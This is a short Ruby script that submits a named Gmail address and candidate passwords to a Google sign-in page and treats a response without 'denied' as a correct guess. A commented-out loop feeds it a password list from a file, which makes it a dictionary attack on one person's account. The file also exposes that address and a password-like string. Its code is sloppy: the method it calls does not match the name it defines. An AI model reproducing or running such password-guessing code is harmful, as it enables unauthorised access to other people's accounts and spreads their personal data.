require 'net/http'
require 'uri'

def wrong_pass password
	uri = URI.parse 'https://accounts.google.com/signin/v2/sl/pwd?hl=ru&passive=true&continue=https%3A%2F%2Fwww.google.com%2F%3Fhl%3Dru&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
	response = Net::HTTP.post_form(uri, :username => "popovartem505@gmail.com", :password => password).body
	response.include? "denied"
end


puts wrong_pass ",pl.[by[jkmw2003"



























=begin
input = File.open "Password.txt", "r"  

	while line = input.gets
		line.strip!
		print "password: ...#{line}..."
		if wrong_pass? line
			puts "Error"
			sleep 0.40
		else
			puts "It's OK"
			sleep 0.40
			
			exit
		end
	end
input.close
=end
